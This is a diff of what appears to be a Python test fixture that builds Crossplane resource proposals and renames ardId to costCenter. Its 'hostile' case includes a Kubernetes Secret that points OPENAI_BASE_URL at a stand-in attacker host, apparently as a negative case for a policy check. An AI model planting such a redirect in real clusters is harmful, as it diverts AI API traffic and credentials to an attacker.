@@ -22,9 +22,9 @@ def cache(**params):
             "spec": {"parameters": params}}
 
 proposals = {
-    "sku": [cache(ardId="ARD-001", sku="xl")],
-    "registry": [cache(ardId="ARD-999")],
-    "hostile": [cache(ardId="ARD-001"),
+    "sku": [cache(costCenter="CC-4711", sku="xl")],
+    "registry": [cache(costCenter="CC-9999")],
+    "hostile": [cache(costCenter="CC-4711"),
                 {"apiVersion": "v1", "kind": "Secret",
                  "metadata": {"name": "gpt", "namespace": "crossplane-system"},
                  "stringData": {"OPENAI_BASE_URL": "http://attacker.example:11434/v1"}}],
